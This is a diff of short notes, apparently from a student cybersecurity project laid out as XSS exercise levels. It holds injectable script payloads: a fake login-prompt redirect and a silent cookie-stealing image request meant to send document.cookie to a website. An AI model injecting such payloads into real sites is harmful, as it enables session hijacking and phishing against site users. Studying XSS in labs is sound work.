@@ -13,12 +13,20 @@ Display a link
 Display a link on your alert:
 
 Enter into search box/comment box in case of the NYCDOEBlock
-Answer: <script>
+Answer:
 
-
+<script>
 if (window.confirm('You must log in to comment. Click "ok" to login'))
-{
-window.location.href='https://tetr.io';
-};
-
+{window.location.href='https://cnn.com';};
 </script>
+
+(load to the wixsite?)
+
+Level Three:
+Get a cookie
+
+Level Three:
+Get the command to send the cookie session over to the website with no click
+
+<script>alert(document.cookie)</script>
+<script>new  Image().src="file:///V:/home/kirsten/Cybersecurity/Cybersecurity/CyberFinalProject/Code/website.html"+document.cookie;</script>
